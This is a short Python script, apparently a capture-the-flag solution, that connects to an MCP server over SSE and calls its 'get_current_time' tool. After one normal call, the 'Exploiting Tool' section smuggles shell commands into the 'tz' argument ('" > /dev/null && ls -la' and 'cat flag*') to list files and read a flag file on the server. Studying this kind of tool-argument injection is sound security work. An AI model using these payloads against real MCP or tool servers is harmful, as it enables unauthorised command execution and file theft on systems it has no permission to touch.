#!/usr/bin/env python3
import asyncio
from typing import Optional

from mcp import ClientSession
from mcp.client.sse import sse_client


server_url='http://HOSTNAME:PORT/sse'

async def main():
	streams_context = sse_client(url=server_url)
	streams = await streams_context.__aenter__()
	session_context = ClientSession(*streams)
	session: ClientSession = await session_context.__aenter__()
	await session.initialize()

	# Print tools
	#response = await session.list_tools()
	#tools = response.tools
	#print("\nConnected to server with tools:", [tool.name for tool in tools])
	
	print('Testing Tool...')
	result = await session.call_tool('get_current_time', {'tz': 'Europe/Athens'})
	print(result.content[0].text)
	print('\n')

	print('Exploiting Tool...')
	result = await session.call_tool('get_current_time', {'tz': '" > /dev/null && ls -la 2>&1 #'})
	print(result.content[0].text)
	result = await session.call_tool('get_current_time', {'tz': '" > /dev/null && cat flag* 2>&1 #'})
	print(result.content[0].text)

	# Close
	if session_context:
		await session_context.__aexit__(None, None, None)
	if streams_context:
		await streams_context.__aexit__(None, None, None)

if __name__ == "__main__":
	asyncio.run(main())
